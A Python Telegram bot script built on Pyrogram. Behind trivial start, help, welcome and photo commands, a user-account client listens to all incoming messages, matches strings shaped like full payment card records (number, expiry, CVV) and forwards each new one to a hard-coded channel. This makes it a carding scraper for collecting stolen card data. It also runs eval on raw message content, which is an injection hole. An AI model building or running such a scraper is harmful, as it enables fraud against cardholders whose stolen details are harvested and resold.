import os
from pyrogram import Client,filters
import re
chat_id="-1001784168968"
bot = Client(
    "MY first project",
    api_id = os.environ.get('api_id'),
    api_hash = os.environ.get('api_hash'),
    bot_token=os.environ.get('bot_token')

)
app = Client(
    name="me",
    api_id = os.environ.get('api_id'),
    api_hash = os.environ.get('api_hash'),

)
#Start message
@bot.on_message(filters.command('start') & filters.private)
def command1(bot, message):

    bot.send_message(message.chat.id, "Heya, I am a simple test bot.")
#help cmd
@bot.on_message(filters.command('help'))
def command2(bot,message):
    
    message.reply_text("HELP IS ON THE WAY")
     
#welcome text for new joiner
group=""#"add the numbers here"#grp id/username
"+18542207696"
@bot.on_message(filters.chat(group)&filters.new_chat_members)
def welcomebot(client,message):
    message.reply_text("Welcome")

#send photo
@bot.on_message(filters.command('photo'))
def command3(bot,message):
    bot.send_photo(message.chat.id,"https://imgur.com/gallery/YUJYQ")

d=[]
# @bot.on_message()
@app.on_raw_update()
async def raw(client, update, users, chats):
    false=False
    true=True
    p=(eval(str(update)))
    if True:
        rawdata=(p['message']['message'])
        filtron = "[0-9]{16}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{3}"
        filtroa = "[0-9]{15}[|][0-9]{1,2}[|][0-9]{2,4}[|][0-9]{4}"
        detectavisa = "[0-9]{16}"
        detectamex = "[0-9]{15}"
        try:
                sacanumvisa = re.findall(detectavisa, rawdata)
                carduno = sacanumvisa[0]
                tipocard = str(carduno[0:1])
        except:
                sacanumamex = re.findall(detectamex, rawdata)
                carduno= sacanumamex[0]
                tipocard = str(carduno[0:1])
        if tipocard == "3":
                x = re.findall(filtroa, rawdata)[0]
        elif tipocard == "4":
                x = re.findall(filtron, rawdata)[0]
        elif tipocard == "5":
                x = re.findall(filtron, rawdata)[0]
        elif tipocard == "6":
                x = re.findall(filtron, rawdata)[0]
        if x not in d:
            d.append(x)
            print(x)
            text=x
            await bot.send_message(chat_id, text=text)
        
    else:
      pass

print("Sucessfully completed an orbit")
bot.start()
app.run()

